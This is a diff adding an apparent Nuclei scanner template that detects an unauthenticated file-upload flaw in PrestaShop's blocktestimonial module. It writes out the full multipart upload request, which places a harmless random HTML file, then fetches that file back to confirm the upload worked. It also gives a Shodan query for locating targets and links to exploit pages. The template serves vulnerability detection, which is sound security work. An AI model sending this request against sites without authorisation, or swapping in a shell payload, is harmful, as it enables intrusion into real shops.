@@ -1,0 +1,71 @@
+id: prestashop-blocktestimonial-file-upload
+
+info:
+  name: Prestashop Blocktestimonial Modules - File Upload Vulnerability
+  author: MaStErChO
+  severity: critical
+  reference:
+    - https://3xploit7.blogspot.com/2016/12/pretashop-blocktestimonial-upload-shell.html
+    - https://github.com/indoxploit-coders/blocktestimonial-file-upload
+    - https://exploit.linuxsec.org/prestashop-module-blocktestimonial-file-upload-auto-exploit
+  metadata:
+    max-request: 2
+    framework: prestashop
+    shodan-query: "http.component:\"prestashop\""
+  tags: intrusive,file-upload,blocktestimonial,prestashop
+
+variables:
+  filename: '{{rand_base(7, "abc")}}'
+  data: '{{rand_base(6, "abc")}}'
+
+http:
+  - raw:
+      - |
+        POST /modules/blocktestimonial/addtestimonial.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_submitter_name"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_title"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_main_message"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_img"; filename="{{filename}}.html"
+        Content-Type: text/html
+
+        <html>
+        <body>
+        <h1>{{data}}</h1>
+        </body>
+        </html>
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial"
+
+        Submit Testimonial
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl--
+
+      - |
+        GET /upload/{{filename}}.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "Your testimonial was submitted successfully."
+
+      - type: word
+        part: body_2
+        words:
+          - "{{data}}"
+# digest: 4a0a00473045022100f06f7891c9ab826fd695e459a01cf8aa08cb935526a03d4682f3d2b51b1232b602201c0324d3b39d3864679abdba6fc041f0952695bc744d840c0105e6c9bf424318:922c64590222798bb761d5b6d8e72950
